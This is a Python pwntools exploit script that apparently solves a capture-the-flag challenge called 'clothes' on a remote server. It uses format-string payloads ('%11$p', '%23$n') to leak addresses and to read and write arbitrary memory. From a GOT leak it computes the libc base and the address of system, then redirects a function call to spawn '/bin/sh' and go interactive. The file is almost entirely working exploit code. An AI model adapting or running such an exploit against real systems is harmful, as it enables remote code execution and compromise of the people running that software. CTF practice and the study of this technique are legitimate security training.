#!/usr/bin/env python
from pwn import *
from functools import wraps
import itertools

context.log_level = 'error'
e = ELF('./clothes')
r = None

def wrap(f):
    @wraps(f)
    def wrapped_f(*args, **kwargs):
        log.info('Called: ' + f.__name__ + repr(args))
        return f(*args, **kwargs)
    return wrapped_f

@wrap
def new_cust(name):
    r.sendline('N')
    r.sendline(name)
    r.recvuntil('Choice: ')

def add_hat(slot, type):
    r.recvuntil("trunk?")
    r.sendline("1") #add item
    r.recvuntil("in?")
    r.sendline(str(slot)) #specify slot
    r.recvuntil("shoes")
    r.sendline("1") #hat
    r.recvuntil("slot")
    slot_res = int(r.recvuntil("\n").strip())
    r.recvuntil("boonie):")
    r.sendline(type)
    return slot_res

def add_shirt(slot, size, text):
    r.recvuntil("trunk?")
    r.sendline("1") #add item
    r.recvuntil("in?")
    r.sendline(str(slot)) #specify slot
    r.recvuntil("shoes")
    r.sendline("2") # shirt
    r.recvuntil("slot")
    slot_res = int(r.recvuntil("\n").strip())
    r.recvuntil("l):")
    r.sendline(size)
    r.recvuntil("text:")
    r.sendline(text)
    r.recvuntil("red: ")
    print_res = r.recvuntil("\n").rstrip("\n")
    return slot_res, print_res

def add_shoes(slot, size):
    r.recvuntil("trunk?")
    r.sendline("1") #add item
    r.recvuntil("in?")
    r.sendline(str(slot)) #specify slot
    r.recvuntil("shoes")
    r.sendline("4") # shirt
    r.recvuntil("slot")
    slot_res = int(r.recvuntil("\n").strip())
    r.recvuntil("l):")
    r.sendline(size)
    return slot_res

def remove_item(slot):
    r.recvuntil("trunk?")
    r.sendline("2") #remove item
    r.recvuntil("from?")
    r.sendline(str(slot)) #which slot
    res = r.recvuntil("Action")
    if "empty" in res:
        return False
    else:
        return True

def leak_text_base():
    slot, text_leak = add_shirt(1, 'l', "%11$p")
    slot += 1
    text_base = int(text_leak, 16) - 0x1975
    remove_item(slot)
    return text_base

def arb_write(addr, value):
    assert len(str(value)) == 1
    slot, text_leak = add_shirt(1, 'l', "%{}x%23$n{}".format(str(value), p64(addr)))
    slot += 1
    remove_item(slot)

def arb_read(addr):
    slot, text_leak = add_shirt(1, 'l', "___%23$s{}".format(p64(addr)))
    slot += 1
    remove_item(slot)
    text_leak = u64(text_leak[3:3+6].ljust(8, "\x00"))
    return text_leak

LOCAL = False

def main():
    global r
    env = {}

    if LOCAL:
        local_base = 0x0000555555554000
        gdb_script = ""
        #gdb_script += "b *{}\n".format(hex(local_base + 0x36a4))  # print in shirt alloc
        gdb_script += "b *{}\n".format(hex(local_base + 0x1e51)) # function call in free shoes
        gdb_script += "\nc"
        r = process('./clothes', env=env)
        #gdb.attach(r, gdb_script)
        l = ELF("./local_libc.so")
    else:
        r = remote("challenge.acictf.com", 3622)
        l = ELF("./libc.so")

    text_base = leak_text_base()
    print("[+] text base", hex(text_base))

    records_addr = text_base + 0x206160
    print("[+] records addr", hex(records_addr))
    empty_slot_addr = text_base + 0x206118
    print("[+] empty addr", hex(empty_slot_addr))

    putchar_got_addr = text_base + e.got['putchar']
    print("[+] putchar got addr", hex(putchar_got_addr))
    putchar_addr = arb_read(putchar_got_addr)
    print("[+] putchar act addr", hex(putchar_addr))

    libc_base = putchar_addr - l.symbols['putchar']
    print("[+] libc base addr", hex(libc_base))

    system_addr = libc_base + l.symbols['system']
    print("[+] system addr", hex(system_addr))
    assert system_addr & 1 == 0

    arb_write(empty_slot_addr, 8) #sets empty to 8

    arb_write(records_addr, 4)
    for i in range(124): #sets the index at position 0 to 0x14 aka 20
        print(i)
        remove_item(1)

    """
    Pants and hat both have call 0
    This triggers the weird shoe case
    
    0x55555576e8a0    
    """

    offset = 0x55555576e96c - 0x55555576e8a0
    add_shirt(1, "l", "/bin/sh\x00" + p64(system_addr) + p64(offset) + "D" * 8 + "E" * 8 + "F" * 8)

    #remove item, without the final wait
    r.recvuntil("trunk?")
    r.sendline("2") #remove item
    r.recvuntil("from?")
    r.sendline(str(1)) #which slot

    print("### GOING INTERACTIVE")
    r.interactive()

if __name__ == '__main__':
    main()
